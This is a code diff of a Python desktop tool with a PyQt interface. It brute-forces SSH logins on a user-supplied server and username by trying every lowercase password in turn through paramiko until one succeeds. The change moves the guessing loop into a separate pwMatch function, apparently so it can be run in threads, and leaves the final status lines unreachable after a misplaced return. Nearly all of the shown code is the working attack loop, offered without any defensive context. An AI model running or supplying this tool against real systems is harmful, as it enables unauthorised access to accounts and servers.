@@ -9,7 +9,7 @@ import os
 import re
 import time
 import functions
-import getpass
+import threading
 
 cli = paramiko.SSHClient()
 cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)
@@ -63,35 +63,38 @@ class MyApp(QWidget):
 
 
     def onStart(self):
-        server = self.inputServer.text()
-        user = self.inputUser.text()
-        self.inputServer.setDisabled(True)
-        self.inputUser.setDisabled(True)
-        charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
-        result = "a"
-        start_time = time.time()
-        pwMatched = True
-        while pwMatched:
-            ok = True
-            QApplication.processEvents()
-            try:
-                cli.connect(server, port=22, username=user, password=result)
-            except paramiko.ssh_exception.AuthenticationException as e:
-                ok = False
-            cli.close()
-            if ok == True:
-                pwMatched = False
-                break
-            increased = functions.str_increaser(result, charList, 1)
-            if increased != "str_increaser(): Input already max in charset":
-                result = increased
-            else:
-                result = "a"+"a"*result.__len__()
-            self.lbl.setText(result)
-            self.lbl.adjustSize()
-            self.lbl.repaint()
-        self.lbl.setText("finished!"+" - "+result+"\n"+"--- "+str(round(time.time() - start_time, 2))+" seconds --- ")
-        self.lbl.adjustSize()
+        pwMatch(self, "a", 1, self.lbl, self.inputServer, self.inputUser)
+def pwMatch(self, start, jump, label, serverInput, userInput):
+    server = serverInput.text()
+    user = userInput.text()
+    serverInput.setDisabled(True)
+    userInput.setDisabled(True)
+    charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+    result = start;
+    start_time = time.time()
+    pwMatched = True
+    while pwMatched:
+        ok = True
+        QApplication.processEvents()
+        try:
+            cli.connect(server, port=22, username=user, password=result)
+        except paramiko.ssh_exception.AuthenticationException as e:
+            ok = False
+        cli.close()
+        if ok == True:
+            pwMatched = False
+            break
+        increased = functions.str_increaser(result, charList, jump)
+        if increased != "str_increaser(): Input already max in charset":
+            result = increased
+        else:
+            result = "a"+"a"*result.__len__()
+        label.setText(result)
+        label.adjustSize()
+        label.repaint()
+    return result, 
+    label.setText("finished!"+" - "+result+"\n"+"--- "+str(round(time.time() - start_time, 2))+" seconds --- ")
+    label.adjustSize()
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
